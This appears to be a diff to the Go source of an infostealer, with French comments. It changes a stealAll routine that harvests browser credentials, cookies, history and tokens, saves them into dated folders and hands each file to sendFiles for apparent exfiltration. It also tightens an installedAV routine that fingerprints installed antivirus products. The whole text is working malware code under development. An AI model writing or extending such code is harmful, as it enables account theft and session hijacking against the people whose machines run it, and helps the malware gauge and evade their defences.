@@ -331,6 +331,10 @@ func stealAll(withChat bool) {
 
 	creds, cookies, hist, tokens := stealBrowsers()
 
+	// Chaque extraction vit dans son propre dossier daté sous steal/ : le
+	// disque garde une trace par jour, sans mélanger les passages.
+	outDir := stealDir()
+
 	var b strings.Builder
 	b.WriteString("### EXFILTRATION — " + time.Now().Format("02/01 15:04") + "\n")
 	b.WriteString("```")
@@ -383,17 +387,17 @@ func stealAll(withChat bool) {
 	// localement pour que exfilAll() puisse relancer en cas d'échec réseau.
 	if len(credLines) > 0 {
 		data := []byte(strings.Join(credLines, "\n"))
-		_ = os.WriteFile(workPath("creds.txt"), data, 0600)
+		_ = os.WriteFile(filepath.Join(outDir, "identifiants.txt"), data, 0600)
 		sendFiles(fileOut{Name: "identifiants.txt", Data: data})
 	}
 	if len(cookieLines) > 0 {
 		data := []byte(strings.Join(cookieLines, "\n"))
-		_ = os.WriteFile(workPath("cookies.txt"), data, 0600)
+		_ = os.WriteFile(filepath.Join(outDir, "cookies.txt"), data, 0600)
 		sendFiles(fileOut{Name: "cookies.txt", Data: data})
 	}
 	if len(histLines) > 0 {
 		data := []byte(strings.Join(histLines, "\n"))
-		_ = os.WriteFile(workPath("history.txt"), data, 0600)
+		_ = os.WriteFile(filepath.Join(outDir, "historique.txt"), data, 0600)
 		sendFiles(fileOut{Name: "historique.txt", Data: data})
 	}
 
@@ -411,7 +415,7 @@ func stealAll(withChat bool) {
 				txt.WriteString("élévation : utilisateur standard\n")
 			}
 			data := []byte(txt.String())
-			_ = os.WriteFile(workPath("licence.txt"), data, 0600)
+			_ = os.WriteFile(filepath.Join(outDir, "licence.txt"), data, 0600)
 			sendFiles(fileOut{Name: "licence.txt", Data: data})
 		}
 	}
@@ -769,9 +773,11 @@ func installedAV() string {
 		"zonealarm", "clamwin", "g data", "comodo", "bullguard", "vipre", "webroot"}
 	list := installedPrograms()
 	for _, p := range list {
-		lp := strings.ToLower(p)
+		lp := " " + strings.ToLower(p) + " "
 		for _, k := range known {
-			if strings.Contains(lp, k) {
+			// Mot entier : « eset » ne doit pas matcher « PreSETs ».
+			if strings.Contains(lp, " "+k+" ") || strings.Contains(lp, k+" ") ||
+				strings.Contains(lp, " "+k) {
 				return p
 			}
 		}
